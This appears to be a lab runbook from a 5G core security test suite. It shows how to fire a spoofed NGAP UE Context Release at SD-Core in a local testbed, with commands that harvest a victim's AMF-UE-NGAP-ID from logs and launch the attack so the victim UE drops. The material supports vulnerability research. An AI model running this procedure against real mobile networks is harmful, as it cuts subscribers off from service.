# SD-Core — UE Context Release → victim actually disconnects (T06)

Git Bash, from `ngap_tester/`. Terminals / live logs / how to verify: see [`../README.md`](../README.md).
The decisive SD-Core result: unlike OAI (command → requester) and Open5GS/free5GC (rejected by
binding), SD-Core sends the release command to the **victim's real gNB** → the victim drops.
kind: `--network kind`; AMF captured on node netns `sdcore-control-plane`.

**1. RAN**
```bash
../5g-lab/scripts/ran.sh up ueransim sdcore
```
**2. Fresh victim AMF-UE-NGAP-ID**
```bash
docker restart ueransim-sdcore-ueransim-ue-1; sleep 12
V=$(kubectl logs -n sdcore -l app=amf --tail=50 2>&1 | grep -oE 'AMF_UE_NGAP_ID:[0-9]+' | tail -1 | grep -oE '[0-9]+'); echo $V
```
**3. Capture + fire**
```bash
export AMF_FILTER='sctp or (udp port 8805) or (udp port 2152) or (tcp portrange 8000-9100) or (tcp port 29518)'
CFG_CORE=sdcore ./capture_attack.sh sdcore_T06_ue_release_victim_disconnect \
    sdcore-control-plane - ueransim-sdcore-ueransim-gnb-1 kind 25 \
    -- ue-release --amf-ue-id $V --ran-ue-id 99
```
**Expect:** NGAP **42** (our request) then **41** (the AMF's UEContextReleaseCommand, sent to the
victim's real gNB `172.20.0.3`) in `amf_ngap_nas_sbi.pcap`; victim UE ping → **100% loss**.
**Restore:** `docker restart ueransim-sdcore-ueransim-ue-1`
